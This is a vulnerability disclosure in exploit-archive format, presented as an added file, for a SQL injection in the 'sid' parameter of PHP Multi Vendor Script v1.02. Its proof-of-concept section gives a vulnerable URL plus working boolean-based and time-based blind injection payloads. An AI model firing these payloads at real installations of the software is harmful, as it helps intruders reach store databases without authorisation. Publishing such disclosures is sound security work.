@@ -1,0 +1,41 @@
+# Exploit Title: PHP Multi Vendor Script v1.02 - 'sid' Parameter SQL Injection
+# Date: 2017-09-28
+# Exploit Author: 8bitsec
+# Vendor Homepage: http://www.dexteritysolution.com/
+# Software Link: http://www.dexteritysolution.com/php-multivendor-e-commerce-script.html
+# Version: 1.02
+# Tested on: [Kali Linux 2.0 | Mac OS 10.12.6]
+# Email: contact@8bitsec.io
+# Contact: https://twitter.com/_8bitsec
+
+Release Date:
+=============
+2017-09-28
+
+Product & Service Introduction:
+===============================
+In this business world everyone prefers to do online shopping in order to make their shopping easily because it consumes time.
+
+Technical Details & Description:
+================================
+
+SQL injection on [sid] parameter.
+
+Proof of Concept (PoC):
+=======================
+
+SQLi:
+
+http://localhost/[path]/single_detail.php?sid=15 AND 5068=5068
+
+Parameter: sid (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: sid=15 AND 5068=5068
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: sid=15 AND SLEEP(5)
+
+==================
+8bitsec - [https://twitter.com/_8bitsec]
